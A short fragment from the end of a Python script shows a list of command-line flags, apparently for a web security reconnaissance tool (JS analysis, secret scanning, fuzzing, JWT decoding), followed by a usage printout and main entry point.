        "--analyze-js", "--scan-secrets", "--collect-urls", "--fuzz",
        "--decode-b64", "--decode-jwt", "--payloads", "--crt", "--hash",
        "--report", "--help", "--pipeline", "--interactive", "--modules", "--version"
    ]):
        print_usage()


if __name__ == "__main__":
    main()
